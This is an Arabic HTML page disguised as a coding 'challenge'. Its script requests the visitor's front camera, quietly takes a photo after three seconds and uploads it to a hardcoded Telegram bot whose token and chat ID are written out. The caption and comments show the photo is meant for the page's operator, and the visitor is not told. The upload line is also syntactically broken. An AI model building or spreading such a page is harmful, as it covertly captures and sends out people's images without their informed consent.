<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي البرمجة - Mechanical Bot</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; margin: 0; }
        .container { padding: 20px; }
        video { border: 5px solid #00ff00; border-radius: 15px; background: #000; width: 90%; max-width: 400px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        .btn { padding: 15px 40px; font-size: 18px; cursor: pointer; background: #00ff00; border: none; border-radius: 50px; margin-top: 25px; color: black; font-weight: bold; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
        .btn:hover { background: #00cc00; transform: scale(1.05); }
        h2 { color: #00ff00; }
        p { color: #aaa; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>مرحباً بك في تحدي البرمجة! 🚀</h2>
        <p>اضغط على الزر أدناه لبدء الاختبار</p>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
        <br>
        <button class="btn" onclick="startTest()">إبدأ التحدي (Click Here)</button>
    </div>

    <script>
        // المعلومات الصحيحة والمحدثة بناءً على صورك
        const botToken = "8608335050:AAEgtooX2E-AC9Uk_jT1R5P7K3F0zpXsQzQ"; 
        const chatId = "8124196406"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function startTest() {
            // طلب إذن الكاميرا
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    // الانتظار 3 ثوانٍ لالتقاط الصورة وإرسالها
                    setTimeout(takeAndSendPhoto, 3000);
                })
                .catch(err => {
                    alert("عذراً! يجب الموافقة على إذن الكاميرا ليعمل التحدي.");
                    console.error(err);
                });
        }

        function takeAndSendPhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', '📸 وصلت صورة جديدة من موقعك بنجاح! 🔥');

                // إرسال الصورة إلى Telegram باستخدام الرابط المصلح
                fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if(data.ok) {
                        alert("ممتاز! تم إرسال نتيجتك إلى البوت بنجاح.");
                    } else {
                        alert("الربط سليم ولكن البوت يحتاج تفعيل. أرسل له /start أولاً.");
                    }
                })
                .catch(err => {
                    alert("حدث خطأ في الاتصال، حاول مرة أخرى.");
                    console.error(err);
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
